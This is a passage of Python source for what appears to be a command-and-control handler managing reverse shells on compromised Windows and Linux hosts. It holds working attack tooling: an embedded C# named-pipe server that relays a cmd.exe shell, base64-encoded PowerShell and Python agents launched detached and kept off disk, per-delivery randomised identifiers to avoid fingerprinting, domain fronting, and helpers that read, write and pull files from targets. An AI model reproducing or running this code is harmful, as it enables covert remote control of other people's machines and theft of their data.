            new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null),
            PipeAccessRights.ReadWrite | PipeAccessRights.CreateNewInstance,
            AccessControlType.Allow
        ));

        var server = new NamedPipeServerStream(
            pipeName,
            PipeDirection.InOut,
            1,
            PipeTransmissionMode.Byte,
            PipeOptions.None,
            0, 0,                    // in/out buffer sizes (0 = default)
            security                 // DACL
        );

        // Wait for the handler to connect. Bounded so the pipe server
        // does not linger forever when the operator falls back to the
        // loopback channel after a failed SMB attempt.
        if (!server.WaitForConnection(30000)) {{
            server.Dispose();
            return;
        }}

        var psi = new ProcessStartInfo {{
            FileName = "cmd.exe",
            UseShellExecute = false,
            RedirectStandardInput  = true,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            CreateNoWindow = true,
        }};
        var proc = Process.Start(psi);

        // Reader: pipe -> shell stdin
        var t1 = Task.Run(() => {{
            var hdr = new byte[4];
            while (true) {{
                if (!ReadExact(server, hdr, 4)) break;
                int len = BitConverter.ToInt32(hdr, 0);
                if (len <= 0 || len > 16 * 1024 * 1024) break;
                var payload = new byte[len];
                if (!ReadExact(server, payload, len)) break;
                proc.StandardInput.BaseStream.Write(payload, 0, len);
                proc.StandardInput.BaseStream.Flush();
            }}
        }});

        // Writer: shell stdout -> pipe
        var t2 = Task.Run(() => {{
            var buf = new byte[65536];
            int n;
            while ((n = proc.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0) {{
                SendFrame(server, buf, n);
            }}
        }});

        // Writer: shell stderr -> pipe
        var t3 = Task.Run(() => {{
            var buf = new byte[65536];
            int n;
            while ((n = proc.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0) {{
                SendFrame(server, buf, n);
            }}
        }});

        Task.WaitAll(t1, t2, t3);
    }}

    static bool ReadExact(Stream s, byte[] buf, int n) {{
        int off = 0;
        while (off < n) {{
            int r = s.Read(buf, off, n - off);
            if (r <= 0) return false;
            off += r;
        }}
        return true;
    }}

    static void SendFrame(Stream s, byte[] buf, int len) {{
        var hdr = BitConverter.GetBytes(len);
        s.Write(hdr, 0, 4);
        s.Write(buf, 0, len);
        s.Flush();
    }}
}}
'''

    def _deliver_smb_agent(self, client_sock, pipe_name, shell_kind):
        """
        Deliver the C# named-pipe server to a Windows target and launch it
        in a detached background job.

        Returns True if the launch command was sent.
        """
        csharp = self._smb_payload(pipe_name)

        # Wrap in a script that compiles via Add-Type and starts the server
        # in a background runspace so the shell returns immediately.
        script = (
            "Add-Type -TypeDefinition @\"\n"
            + csharp
            + "\n\"@ -Language CSharp\n"
            + f"[SmbShell]::Run('{pipe_name}')"
        )

        # The C# payload is a here-string and contains many double
        # quotes; naive quote-escaping breaks it. Encode the entire
        # script as UTF-16LE base64 and let PowerShell's
        # [ScriptBlock]::Create handle the dequoting — no here-string
        # rewriting, no add-type corruption.
        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')

        # Short launcher: reconstruct the scriptblock from base64, then
        # run it in a detached background job so the shell is freed.
        marker = 'M' + secrets.token_hex(6)
        varname = 'v' + secrets.token_hex(4)
        launch = (
            f"${varname}=[Text.Encoding]::Unicode.GetString("
            f"[Convert]::FromBase64String('{encoded}'));"
            f"Start-Job -ScriptBlock ([ScriptBlock]::Create(${varname})) | Out-Null;"
            f"Remove-Variable {varname} -EA 0; '{marker}'"
        )

        if shell_kind == 'powershell':
            return self.send_to_revshell(client_sock, launch)

        # cmd.exe: base64 the whole launch command too.
        cmd = self._win_ps_cmd(launch)
        if cmd:
            return self.send_to_revshell(client_sock, cmd)

        return self._send_win_ps(client_sock, launch)

    def smb_switch(self, client_id, pipe_name=None,
                   username='', password='', domain=''):
        """
        Deploy an SMB named-pipe server on a Windows target and attach the
        handler as an SMB client.

        If pipe_name is None, a randomised name is chosen.
        """
        info = self._get_info_by_id(client_id)

        if info is None:
            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
            return False

        if (info.get('type') or '').lower() != 'windows':
            print(f"{self.colors['red']}[SMB] SMB named pipes require a Windows target{self.colors['end']}")
            return False

        if not _SMB_AVAILABLE:
            print(f"{self.colors['yellow']}[SMB] smb_transport unavailable "
                  f"({_SMB_IMPORT_ERROR or 'module missing'}) — using the "
                  f"same-host secondary channel{self.colors['end']}")
            return self._smb_switch_loopback(client_id, pipe_name)

        # Two backends, one command:
        #
        #   * --user / --pass supplied  → explicit credentials for the
        #     network SMB session.
        #
        #   * no credentials            → use the handler's *current* logon
        #     context. On a Windows handler, smbprotocol's SSPI path uses
        #     the operator's token automatically; on a Linux handler with
        #     smbprotocol[kerberos] and a valid TGT, the same happens over
        #     GSSAPI. This is the "net use without credentials" behaviour.
        #
        # If the SSO attempt fails with an auth error, fall back to the
        # same-host loopback channel (HTTP/2). The fallback is chosen only
        # when the SMB path is genuinely unavailable, not pre-emptively.
        use_sso = (not username and not password)

        if info['transports'].get('smb') is not None:
            print(f"{self.colors['yellow']}[SMB] SMB transport already active on "
                  f"#{client_id}{self.colors['end']}")
            return False

        if not pipe_name:
            pipe_name = 'svc' + secrets.token_hex(4)

        primary = info['sock']
        shell_kind = info.get('win_shell') or 'cmd'

        print(f"{self.colors['cyan']}[SMB] Deploying named-pipe server "
              f"(\\\\.\\pipe\\{pipe_name}) on #{client_id}{self.colors['end']}")

        if not self._deliver_smb_agent(primary, pipe_name, shell_kind):
            print(f"{self.colors['red']}[SMB] Failed to deliver agent{self.colors['end']}")
            return False

        # The pipe server is created by a detached PowerShell job that
        # has to compile the C# via Add-Type before it opens the pipe.
        # That can take several seconds on a cold .NET runtime, so we
        # retry the SMB open with backoff instead of a single fixed
        # sleep.
        target_host = info['addr'][0]
        delays = (1.0, 1.5, 2.0, 3.0, 4.0, 5.0, 5.0, 5.0)
        bridge = None
        last_exc = None

        for attempt, delay in enumerate(delays, 1):
            time.sleep(delay)
            try:
                bridge = SmbPipeSessionSocket(
                    target_host, pipe_name, username, password, domain,
                )
                bridge.connect(timeout=10.0)
                break
            except Exception as exc:
                last_exc = exc
                # CRITICAL: the bridge object is created before connect()
                # runs, so on failure it survives the loop with a valid
                # socketpair fd. If we don't drop it here, the post-loop
                # `if bridge is None` check treats a dead object as a
                # live transport and registers it. Tear it down now.
                if bridge is not None:
                    try:
                        bridge.close()
                    except Exception:
                        pass
                    bridge = None

                msg = str(exc).lower()
                # "Pipe not yet created" is the only error that benefits
                # from retrying — the target's Add-Type may still be
                # compiling. Everything else is deterministic.
                if 'object_name_not_found' in msg or 'not found' in msg:
                    continue
                if attempt == 1:
                    print(f"{self.colors['yellow']}[SMB] connect failed: "
                          f"{type(exc).__name__}: {exc}{self.colors['end']}")
                break

        if bridge is None:
            # If we got here without explicit credentials, the SSO
            # attempt has failed. The most common cause is that the
            # handler's logon context is not recognised by the target's
            # SMB server (Linux handler without a TGT, Windows handler
            # not on the same domain, etc.). Fall back to the same-host
            # loopback channel rather than giving up.
            if use_sso:
                print(f"{self.colors['yellow']}[SMB] SSO attempt failed "
                      f"({last_exc}) — falling back to the same-host "
                      f"secondary channel{self.colors['end']}")
                return self._smb_switch_loopback(client_id, pipe_name)

            print(f"{self.colors['red']}[SMB] could not attach after "
                  f"{len(delays)} attempts — last error: {last_exc}"
                  f"{self.colors['end']}")
            return False

        # Register the bridge the same way HTTP/2 does.
        info['transports']['smb'] = bridge
        info['active_transport']  = 'smb'
        with self.client_lock:
            self.revshell_clients[bridge] = info

        display = info['name'] if info.get('name') else f"#{info['id']}"
        print(f"{self.colors['green']}[SMB] Transport attached to {display} — "
              f"active transport is now smb{self.colors['end']}")
        return True

    def _smb_switch_loopback(self, client_id, pipe_name=None):
        """
        Same-host secondary channel over the shell the operator already
        owns. No SMB, no credentials, no 445.

        `pipe_name` is accepted for CLI symmetry with the credential
        path, but there is no pipe in loopback mode — the byte path is
        the existing HTTPS secondary transport. If a name was supplied,
        say so once and move on rather than silently dropping it.
        """

        info = self._get_info_by_id(client_id)
        if info is None:
            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
            return False

        if info['transports'].get('smb') is not None:
            print(f"{self.colors['yellow']}[SMB] transport already active on "
                  f"#{client_id}{self.colors['end']}")
            return False

        # Reuse the HTTP/2 path if the operator has already enabled it.
        # Running two concurrent secondary transports over the same shell
        # would require a real multiplexer, and one is never necessary in
        # practice — a session has a single "active" transport at a time.
        if info['transports'].get('http2') is not None:
            print(f"{self.colors['yellow']}[SMB] HTTP/2 transport already "
                  f"active on #{client_id} — no second same-host channel "
                  f"is needed{self.colors['end']}")
            return False

        # Without credentials there is no way to authenticate to the
        # target's SMB server over the network. The best secondary
        # channel available in that case is the existing HTTPS path,
        # which is what http2_switch deploys. The transport will show
        # up as 'http2' in `transport <ID>` — that is accurate.
        print(f"{self.colors['cyan']}[SMB] Using the same-host secondary "
              f"channel (no network SMB involved){self.colors['end']}")
        if pipe_name:
            print(f"{self.colors['yellow']}[SMB] --pipe {pipe_name!r} was "
                  f"supplied but is ignored in loopback mode — there is no "
                  f"pipe, the channel is the existing HTTPS transport"
                  f"{self.colors['end']}")
        return self.http2_switch(client_id)

    def _http2_payload_linux(self, host, port, path, kill_deadline):
        """Return a base64-encoded Python agent for Linux targets."""
        import base64 as _b64
        src = (
            _HTTP2_AGENT_LINUX_PY
            .replace('__H2_HOST__', host)
            .replace('__H2_PORT__', str(port))
            .replace('__H2_PATH__', path)
            .replace('__H2_KILL__', str(int(kill_deadline)))
        )
        return _b64.b64encode(src.encode('utf-8')).decode('ascii')

    def _resolve_bind_ip(self, spec):
        """
        Resolve an interface name or IP address to a concrete IPv4 address.

        - None or empty        → '0.0.0.0'
        - '10.10.14.7'         → '10.10.14.7'  (returned as-is)
        - 'tun0' / 'eth0'      → the interface's IPv4 address
        - unknown interface    → None

        Tries psutil, then `ip -4 addr show <iface>`, then `ifconfig <iface>`.
        Returns None if the interface cannot be resolved.
        """
        if not spec:
            return '0.0.0.0'
        if re.match(r'^\d+\.\d+\.\d+\.\d+$', spec):
            return spec

        try:
            import psutil
            for iface, addrs in psutil.net_if_addrs().items():
                if iface == spec:
                    for a in addrs:
                        if a.family == socket.AF_INET:
                            return a.address
        except Exception:
            pass

        try:
            result = subprocess.run(
                ['ip', '-4', '-o', 'addr', 'show', spec],
                capture_output=True, text=True, timeout=3,
            )
            if result.returncode == 0:
                for line in result.stdout.splitlines():
                    parts = line.split()
                    if len(parts) >= 4 and parts[2] == 'inet':
                        return parts[3].split('/')[0]
        except Exception:
            pass

        try:
            result = subprocess.run(
                ['ifconfig', spec],
                capture_output=True, text=True, timeout=3,
            )
            if result.returncode == 0:
                m = re.search(r'inet\s+(?:addr:)?(\d+\.\d+\.\d+\.\d+)',
                            result.stdout)
                if m:
                    return m.group(1)
        except Exception:
            pass

        return None


    def _pick_default_outbound_ip(self, target_host):
        """
        Return the local IP that would be used to reach target_host.
        Falls back to None if the kernel cannot decide.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2.0)
            s.connect((target_host, 1))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return None

    def _deliver_http2_linux(self, primary_sock, host, port, path):
        """
        Deliver the Linux HTTP/2 agent entirely in memory.

        The Python source is base64-encoded, accumulated into a shell
        variable across multiple PTY-safe chunks, then decoded and piped
        straight into `python3 -` via stdin. No file ever touches disk —
        not even for a fraction of a second.

        `path` is the full HTTP path plus query string (e.g.
        '/c2/<token>?s=<hmac>'), so the agent can present the HMAC proof.

        Process isolation:
          - `setsid` puts the agent in its own session, so it is immune to
            SIGHUP and to signals aimed at the reverse shell's process
            group (which is what killed the previous agent whenever a
            long-running command was typed into the interactive shell).
          - stdout/stderr go to /dev/null so nothing is written back to
            the operator's terminal or to any file on the target.
          - the shell variable holding the base64 is unset immediately
            after launch, so it does not linger in the shell's memory.

        Every operator-visible string (the shell variable name, the
        launch marker) is randomly generated per call, so no two
        deliveries share a fingerprint. The kill date is embedded in
        the payload, not passed on the command line.

        Returns True if the launch command was sent, False on write failure.
        """
        # Kill date: 30 days from now by default. The agent self-destructs
        # past this point. Set TORNADO_KILL_DAYS to override.
        try:
            kill_days = int(os.environ.get('TORNADO_KILL_DAYS', '30'))
        except Exception:
            kill_days = 30
        kill_deadline = int(time.time()) + kill_days * 86400

        b64 = self._http2_payload_linux(host, port, path, kill_deadline)

        # Randomised per-delivery identifiers. `_h2b64` and `H2_LAUNCHED`
        # are replaced with values that differ on every call.
        var    = "_h" + secrets.token_hex(5)
        marker = "M" + secrets.token_hex(6)

        if not self.send_to_revshell(primary_sock, f"{var}=''"):
            return False
        self.recv_output(primary_sock, timeout=0.5)

        CHUNK = 500
        for i in range(0, len(b64), CHUNK):
            piece = b64[i:i + CHUNK]
            if not self.send_to_revshell(
                primary_sock, f"{var}=\"${var}\"'{piece}'"
            ):
                return False
            self.recv_output(primary_sock, timeout=0.4)

        launch = (
            f"printf '%s' \"${var}\" | base64 -d | "
            f"setsid python3 - >/dev/null 2>&1 & "
            f"unset {var}; "
            f"echo {marker}"
        )
        sent = self.send_to_revshell(primary_sock, launch)
        if sent:
            # Return the marker so the caller can wait for it explicitly.
            try:
                info = self._client_info(primary_sock)
                if info is not None:
                    info['_h2_launch_marker'] = marker
            except Exception:
                pass
        return sent

    def _h2_preflight(self, info):
        """
        Return (mode, detail):
        mode = 'h2'    → use HTTP/2 (PS 7+ or Linux)
        mode = 'h1'    → use HTTP/1.1 chunked (PS 5.x)
        mode = None    → target unsuitable
        """
        kind = (info.get('type') or '').lower()
        sock = info.get('sock')
        if not sock:
            return None, 'no primary transport'

        if kind != 'windows':
            # Linux/Unix: the agent needs python3. h2 auto-installs via pip
            # if absent; if both are missing we still try, but flag it.
            check = (
                "command -v python3 >/dev/null && echo PY3 || echo NOPY; "
                "command -v pip3 >/dev/null && echo PIP3 || echo NOPIP"
            )
            self.send_to_revshell(sock, check)
            out = self.recv_output(sock, timeout=3.0)
            if 'PY3' not in out:
                return None, 'python3 not found on target'
            if 'PIP3' not in out:
                return 'h2', 'python3 present, pip3 absent (h2 must already be installed)'
            return 'h2', 'python3 and pip3 present'

        # Windows: query the PowerShell major version.
        ps = (
            "Write-Output ('H1V'+$PSVersionTable.PSVersion.Major+'VEND')"
        )
        self._flush_shell(sock, timeout=0.3)
        self._send_win_ps(sock, ps)
        out = self.recv_output(sock, timeout=5.0)
        m = re.search(r'H1V(\d+)VEND', out)
        if not m:
            return None, 'could not determine PowerShell version'
        major = int(m.group(1))
        if major >= 7:
            return 'h2', f'PowerShell {major}'
        return 'h1', f'PowerShell {major} (HTTP/2 requires PS 7+)'

    def _http1_payload(self, url):
        return _HTTP1_AGENT_PS.replace('__H1_URL__', url)

    def http2_switch(self, client_id, handler_host=None):
        """Spawn an HTTP-based secondary transport and flip the active one."""
        info = self._get_info_by_id(client_id)
        if info is None:
            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
            return False

        if not self.h2_port:
            print(
                f"{self.colors['red']}HTTP listener is not running — "
                f"start the handler with --h2-port{self.colors['end']}"
            )
            return False

        if info['transports'].get('http2') is not None:
            print(
                f"{self.colors['yellow']}HTTP transport already active on "
                f"#{client_id} — no action{self.colors['end']}"
            )
            return False

        if handler_host:
            # User gave either an IP or an interface name.
            resolved = self._resolve_bind_ip(handler_host)
            if resolved is None:
                print(
                    f"{self.colors['red']}[H2] Could not resolve bind target "
                    f"'{handler_host}' to an IPv4 address{self.colors['end']}"
                )
                return False
            handler_host = resolved
        else:
            # Auto-detect: ask the kernel which interface would reach the
            # target, then fall back to the session's local endpoint, then
            # to the listener host.
            target_ip = None
            try:
                target_ip = info['addr'][0]
            except Exception:
                pass
            if target_ip:
                handler_host = self._pick_default_outbound_ip(target_ip)
            if not handler_host:
                try:
                    handler_host = info['sock'].getsockname()[0]
                except Exception:
                    handler_host = None
            if not handler_host or handler_host in ('0.0.0.0', '::'):
                handler_host = self.host if self.host not in ('0.0.0.0', '::') else '127.0.0.1'

        if not handler_host:
            print(
                f"{self.colors['red']}[H2] Could not determine a reachable "
                f"handler IP; pass --rh <ip|iface>{self.colors['end']}"
            )
            return False

        mode, detail = self._h2_preflight(info)
        if mode is None:
            print(
                f"{self.colors['red']}[H2] Target unsuitable for HTTP transport: "
                f"{detail}{self.colors['end']}"
            )
            return False

        print(
            f"{self.colors['cyan']}[H2] Pre-flight: {detail} → using {mode}"
            f"{self.colors['end']}"
        )

        token = secrets.token_hex(8)
        with self.client_lock:
            self._h2_pending[token] = info['sock']

        primary_sock = info['sock']
        shell_kind   = (info.get('type') or 'unknown').lower()

        # Domain fronting / redirector configuration. When set, the
        # agent's SNI and Host header point at the fronting domain; the
        # redirector routes /c2/<token> back to our real listener.
        front_domain = self._front_domain          # set via --front-domain
        front_port   = self._front_port            # optional override

        url = self._build_h2_url(
            handler_host, self.h2_port, token,
            front_domain=front_domain, front_port=front_port,
        )

        if shell_kind == 'windows' and mode == 'h2':
            ps = self._http2_payload(url)
            print(
                f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
                f"(Windows PS 7+, callback {url}){self.colors['end']}"
            )
            sent = self._send_win_ps(primary_sock, ps)

        elif shell_kind == 'windows' and mode == 'h1':
            ps = self._http1_payload(url)
            print(
                f"{self.colors['cyan']}[H2] Spawning HTTP/1.1 agent on #{client_id} "
                f"(Windows PS 5, callback {url}){self.colors['end']}"
            )
            sent = self._send_win_ps(primary_sock, ps)

        else:
            print(
                f"{self.colors['cyan']}[H2] Spawning HTTP/2 agent on #{client_id} "
                f"(Unix, callback {url})"
                f"{self.colors['end']}"
            )
            # The Linux path needs the raw host/port used for the socket
            # connection (which is always the real listener, not the
            # fronting domain), plus the path portion of the URL.
            real_host = handler_host
            real_port = self.h2_port
            from urllib.parse import urlsplit as _us
            _parts = _us(url)
            path = _parts.path
            if _parts.query:
                path += '?' + _parts.query
            sent = self._deliver_http2_linux(
                primary_sock, real_host, real_port, path,
            )

        if not sent:
            print(
                f"{self.colors['red']}[H2] Failed to deliver HTTP agent"
                f"{self.colors['end']}"
            )
            with self.client_lock:
                self._h2_pending.pop(token, None)
            return False

        wait_s   = 45.0 if shell_kind != 'windows' else 25.0
        deadline = time.time() + wait_s
        while time.time() < deadline:
            if info['transports'].get('http2') is not None:
                return True
            time.sleep(0.25)

        print(
            f"{self.colors['yellow']}[H2] No stream within {int(wait_s)}s — "
            f"check target outbound access to {handler_host}:{self.h2_port}"
            f"{self.colors['end']}"
        )
        with self.client_lock:
            self._h2_pending.pop(token, None)
        return False

    def http2_backtoshell(self, client_id):
        """Terminate the HTTP/2 agent and revert to the primary shell."""
        info = self._get_info_by_id(client_id)
        if info is None:
            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
            return False

        # Prefer SMB, then HTTP/2 — whichever is currently attached.
        h2 = info['transports'].get('smb') or info['transports'].get('http2')
        if h2 is None:
            print(
                f"{self.colors['yellow']}No secondary transport active on "
                f"#{client_id}{self.colors['end']}"
            )
            return False

        # Send an exit hint through the HTTP/2 stream. On Windows the child
        # cmd.exe exits on `exit`; on Linux the Python agent terminates its
        # shell and closes the socket, which fires StreamEnded on our side.
        try:
            h2.sendall(b"exit\n")
        except Exception:
            pass
        time.sleep(0.5)

        # Force-close from this side too.
        try:
            h2.close()
        except Exception:
            pass
        with self.client_lock:
            self.revshell_clients.pop(h2, None)
        info['transports']['smb']   = None
        info['transports']['http2'] = None
        info['active_transport']    = 'shell'

        display = info['name'] if info.get('name') else f"#{client_id}"
        print(
            f"{self.colors['green']}Secondary transport closed on "
            f"{display} — reverted to shell{self.colors['end']}"
        )
        logger = info.get('logger')
        if logger:
            logger.log_event("HTTP/2 transport closed; reverted to shell")
        return True

    def _get_primary_sock_by_id(self, client_id):
        """Return the primary (shell) socket for a logical session."""
        with self.client_lock:
            for sock, info in self.revshell_clients.items():
                if info['id'] == client_id and info.get('sock') is sock:
                    return sock
        return None

    def _get_info_by_id(self, client_id):
        with self.client_lock:
            seen = set()
            for _sock, info in self.revshell_clients.items():
                if info['id'] == client_id and id(info) not in seen:
                    seen.add(id(info))
                    return info
        return None

    def _active_sock_for_info(self, info):
        """
        Return the current live transport for a session info dict.

        Preference order:
        1. The transport marked active_transport, if its fileno is valid.
        2. The other transport, if it's still alive.
        3. The primary shell socket as a last resort.
        """
        if info is None:
            return None
        with self.client_lock:
            active     = info.get('active_transport', 'shell')
            transports = dict(info.get('transports') or {})

        candidates = []
        primary = transports.get(active)
        if primary is not None:
            candidates.append(primary)
        for key in ('shell', 'http2', 'smb'):
            t = transports.get(key)
            if t is not None and t not in candidates:
                candidates.append(t)
        if info.get('sock') and info['sock'] not in candidates:
            candidates.append(info['sock'])

        for t in candidates:
            try:
                if t.fileno() != -1:
                    return t
            except Exception:
                continue
        return None

    def transport_status(self, client_id):
        """Print the current transport state for a session."""
        info = self._get_info_by_id(client_id)
        if info is None:
            print(f"{self.colors['red']}Client #{client_id} not found{self.colors['end']}")
            return

        c = self.colors
        active = info.get('active_transport', 'shell')
        shell  = (info.get('transports') or {}).get('shell')
        h2     = (info.get('transports') or {}).get('http2')
        smb    = (info.get('transports') or {}).get('smb')

        def _state(sock):
            if sock is None:
                return f"{c['yellow']}not attached{c['end']}"
            try:
                return (f"{c['green']}alive{c['end']} "
                        f"(fileno={sock.fileno()}, peer={sock.getpeername()})")
            except Exception:
                return f"{c['red']}dead{c['end']}"

        print(f"{c['cyan']}Transport state for #{client_id}:{c['end']}")
        print(f"  active       : {c['bold']}{active}{c['end']}")
        print(f"  shell        : {_state(shell)}")
        print(f"  http2        : {_state(h2)}")
        print(f"  smb          : {_state(smb)}")
        print(f"  last active  : {info.get('last_send_via', '(none yet)')}")
        print(f"  last addr    : {info.get('last_send_addr', '(none)')}")

    def _remote_file_size(self, client_sock, remote_path, shell_type):
        if shell_type == 'unknown':
            for st in ('unix', 'windows'):
                size = self._remote_file_size(client_sock, remote_path, st)
                if size is not None:
                    with self.client_lock:
                        info = self.revshell_clients.get(client_sock)
                        if info:
                            info['type'] = st
                    return size
            return None
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"printf '%s' '{XFER_MARK_START}'; "
            f"(python3 -c \"import os;print(os.path.getsize('{path}'), end='')\" 2>/dev/null || "
            f"python -c \"import os;print(os.path.getsize('{path}'), end='')\" 2>/dev/null || "
            f"stat -c%s '{path}' 2>/dev/null || "
            f"stat -f%z '{path}' 2>/dev/null || "
            f"wc -c < '{path}' 2>/dev/null | tr -d ' \\n'); "
            f"printf '%s' '{XFER_MARK_END}'"
        )
        win_ps = (
            f"$p='{path}';"
            f"if(Test-Path -LiteralPath $p){{"
            f"'{XFER_MARK_START}'+(Get-Item -LiteralPath $p).Length+'{XFER_MARK_END}'"
            f"}}else{{'{XFER_MARK_START}ERR{XFER_MARK_END}'}}"
        )
        payload = self._run_marked(client_sock, unix_cmd, win_ps, shell_type, timeout=10.0)
        if payload == 'ERR':
            return None
        return self._parse_marked_int(payload)

    def _remote_sha256(self, client_sock, remote_path, shell_type):
        if shell_type == 'unknown':
            for st in ('unix', 'windows'):
                digest = self._remote_sha256(client_sock, remote_path, st)
                if digest:
                    with self.client_lock:
                        info = self.revshell_clients.get(client_sock)
                        if info:
                            info['type'] = st
                    return digest
            return None
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"printf '%s' '{XFER_MARK_START}'; "
            f"(python3 -c \"import hashlib;print(hashlib.sha256(open('{path}','rb').read()).hexdigest(), end='')\" 2>/dev/null || "
            f"python -c \"import hashlib;print(hashlib.sha256(open('{path}','rb').read()).hexdigest(), end='')\" 2>/dev/null || "
            f"sha256sum '{path}' 2>/dev/null | awk '{{print $1}}' | tr -d '\\n' || "
            f"shasum -a 256 '{path}' 2>/dev/null | awk '{{print $1}}' | tr -d '\\n'); "
            f"printf '%s' '{XFER_MARK_END}'"
        )
        win_ps = (
            f"$p='{path}';"
            f"if(Test-Path -LiteralPath $p){{"
            f"'{XFER_MARK_START}'+(Get-FileHash -LiteralPath $p -Algorithm SHA256).Hash.ToLower()+'{XFER_MARK_END}'"
            f"}}else{{'{XFER_MARK_START}ERR{XFER_MARK_END}'}}"
        )
        payload = self._run_marked(client_sock, unix_cmd, win_ps, shell_type, timeout=60.0)
        if payload == 'ERR':
            return None
        return self._parse_marked_hash(payload)

    def _remote_truncate(self, client_sock, remote_path, shell_type):
        path = self._escape_path(remote_path, shell_type)
        unix_cmd = (
            f"python3 -c \"open('{path}','wb').close()\" 2>/dev/null || "
            f"python -c \"open('{path}','wb').close()\" 2>/dev/null || "
            f": > '{path}'"
        )
        if shell_type == 'windows':
            parent = os.path.dirname(path.replace('/', '\\')) or '.'
            parent_esc = self._escape_path(parent, shell_type)
            win_ps = (
                f"New-Item -ItemType Directory -Force -Path '{parent_esc}' | Out-Null; "
                f"[IO.File]::WriteAllBytes('{path}', @()); 'OK'"
            )
            cmd = self._win_ps_cmd(win_ps)
        else:
            cmd = unix_cmd
        self._flush_shell(client_sock)
        if not self.send_to_revshell(client_sock, cmd):
            return False
        self.recv_output(client_sock, timeout=3.0)
        return True

    def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False, skip_flush=False):
        path = self._escape_path(remote_path, shell_type)
        b64 = base64.b64encode(chunk_bytes).decode()
        if shell_type == 'windows':
            mode = 'Create' if truncate else 'Append'
            win_ps = (
                f"$d=[Convert]::FromBase64String('{b64}');"
                f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
                f"$fs.Write($d,0,$d.Length);$fs.Close();"
                f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
            )
            cmd = self._win_ps_inline(win_ps)
        else:
            mode = 'wb' if truncate else 'ab'
            cmd = (
                f"printf '%s' '{XFER_MARK_START}'; "
                f"(python3 -c \"import base64;f=open('{path}','{mode}');"
                f"f.write(base64.b64decode('{b64}'));f.close();print('OK', end='')\" 2>/dev/null || "
                f"python -c \"import base64;f=open('{path}','{mode}');"
                f"f.write(base64.b64decode('{b64}'));f.close();print('OK', end='')\" 2>/dev/null || "
                f"(printf '%s' '{b64}' | base64 -d >> '{path}' && printf 'OK')); "
                f"printf '%s' '{XFER_MARK_END}'"
            )
        if not skip_flush:
            self._flush_shell(client_sock, timeout=0.2)
        if not self.send_to_revshell(client_sock, cmd):
            return False
        output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
        payload = self._extract_marked(output)
        return payload == 'OK'

    def _remote_read_chunk(self, client_sock, remote_path, offset, size, shell_type, chunk_index):
        path = self._escape_path(remote_path, shell_type)
        if shell_type == 'windows':
            win_ps = (
                f"$p='{path}';$o={offset};$s={size};"
                f"$fs=[IO.File]::OpenRead($p);$fs.Seek($o,'Begin')|Out-Null;"
                f"$b=New-Object byte[] $s;$n=$fs.Read($b,0,$s);$fs.Close();"
                f"$out='{XFER_MARK_START}';"
                f"if($n -gt 0){{$out+=[Convert]::ToBase64String($b[0..($n-1)])}};"
                f"$out+='{XFER_MARK_END}';$out"
            )
            cmd = self._win_ps_cmd(win_ps)
        else:
            cmd = (
                f"printf '%s' '{XFER_MARK_START}'; "
                f"(python3 -c \"import base64;f=open('{path}','rb');f.seek({offset});"
                f"d=f.read({size});f.close();print(base64.b64encode(d).decode(), end='')\" 2>/dev/null || "
                f"python -c \"import base64;f=open('{path}','rb');f.seek({offset});"
                f"d=f.read({size});f.close();print(base64.b64encode(d).decode(), end='')\" 2>/dev/null || "
                f"dd if='{path}' bs={size} skip={chunk_index} count=1 2>/dev/null | base64 | tr -d '\\n'); "
                f"printf '%s' '{XFER_MARK_END}'"
            )
        self._flush_shell(client_sock, timeout=0.2)
        if not self.send_to_revshell(client_sock, cmd):
            return None
        output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
        payload = self._extract_marked(output)
        if payload is None:
            return None
        if payload == '':
            return b''
        try:
            return base64.b64decode(payload, validate=True)
        except Exception:
            return None

    def upload_file(self, client_sock, local_path, remote_path, resume=False,
                    use_https=False, https_bind=None, rh_host=None, rh_port=None):
        return self.transfer.upload_file(
            client_sock, local_path, remote_path,
            resume=resume,
            use_https=use_https,
            https_bind=https_bind,
            rh_host=rh_host,
            rh_port=rh_port,
        )

    def download_file(self, client_sock, remote_path, local_path, resume=False,
                      use_https_push=False, https_bind=None, rh_host=None,
                      rh_port=None):
        return self.transfer.download_file(
            client_sock, remote_path, local_path,
            resume=resume,
            use_https_push=use_https_push,
            https_bind=https_bind,
            rh_host=rh_host,
            rh_port=rh_port,
        )

    def verify_file(self, client_sock, remote_path):
        return self.transfer.verify_file(client_sock, remote_path)

    def collect_sysinfo(self, client_sock, shell_type='unknown', mode='stealth'):
        timeout = 30.0 if mode == 'full' else 12.0
        if shell_type == 'unknown':
            shell_type = self.resolve_shell_type(client_sock)
        self._flush_shell(client_sock)
        unix_cmd, win_ps = build_collect_commands(shell_type, mode=mode)

        def _collect(st, u, w):
            if st == 'windows' and w:
                if not self._send_win_ps(client_sock, w):
                    return None
            elif u:
                if not self.send_to_revshell(client_sock, u):
                    return None
            else:
                return None
            output = self.recv_output(client_sock, timeout=timeout, until_marker=SYSINFO_MARK_END)
            info = extract_sysinfo(output)
            if info:
                self._pin_shell_type(client_sock, st)
            return info

        if shell_type == 'windows' and win_ps:
            return _collect('windows', None, win_ps)
        if shell_type == 'unix' and unix_cmd:
            return _collect('unix', unix_cmd, None)
        for st in ('windows', 'unix'):
            u, w = build_collect_commands(st, mode=mode)
            info = _collect(st, u, w)
            if info:
                return info
        return None

    def _parse_sysinfo_args(self, cmd_parts, from_client=False):
        mode = 'stealth'
        session_id = None
        args = []
        i = 1
        while i < len(cmd_parts):
            part = cmd_parts[i]
            if part in ('--stealth', '--full'):
